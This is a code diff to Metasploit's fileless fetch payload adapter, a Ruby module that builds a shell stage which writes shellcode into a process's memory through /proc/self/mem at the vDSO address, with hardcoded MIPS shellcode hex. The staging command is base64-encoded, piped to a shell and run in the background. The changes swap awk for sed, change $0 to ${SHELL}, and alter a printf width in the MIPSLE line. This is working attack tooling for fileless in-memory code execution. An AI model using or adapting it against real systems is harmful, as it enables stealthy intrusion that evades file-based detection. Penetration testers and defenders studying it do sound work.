@@ -228,7 +228,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # lw	$t2, 16($ra)
     # jr $t2
     when 'mipsle'
-      %^"000011040000000026504a011000ea8f0800400100000000"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"000011040000000026504a011000ea8f0800400100000000"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
     
     # MIPSBE shellcode
     # bgezal $zero, 4
@@ -287,13 +287,13 @@ def _generate_fileless_shell(get_file_cmd, arch)
   stage_cmd << "addr=$(($(echo $syscall_info | cut -d' ' -f9)));"
   stage_cmd << 'exec 3>/proc/self/mem;'
   stage_cmd << 'dd bs=1 skip=$vdso_addr <&3 >/dev/null 2>&1;'
-  stage_cmd << %(printf "$(writebytes `printf $sc | awk '{gsub(/.{2}/,"0x& ")}1'`)" >&3;)
+  stage_cmd << %(printf "$(writebytes `printf $sc | sed 's/.\\{2\\}/0x& /g'`)" >&3;)
   stage_cmd << 'exec 3>&-;'
   stage_cmd << 'exec 3>/proc/self/mem;'
   stage_cmd << 'dd bs=1 skip=$addr <&3 >/dev/null 2>&1;'
-  stage_cmd << %(printf "$(writebytes `printf $jmp | awk '{gsub(/.{2}/,"0x& ")}1'`)" >&3;)
+  stage_cmd << %(printf "$(writebytes `printf $jmp | sed 's/.\\{2\\}/0x& /g'`)" >&3;)
 
-  cmd = "echo -n '#{Base64.strict_encode64(stage_cmd).gsub(/\n/, '')}' | base64 -d | $0 & "
+  cmd = "echo -n '#{Base64.strict_encode64(stage_cmd).gsub(/\n/, '')}' | base64 -d | ${SHELL} & "
   cmd << 'cd /proc/$!;'
   cmd << 'og_process=$!;'
   cmd << 'sleep 2;' #adding short pause to give process time to load file handle
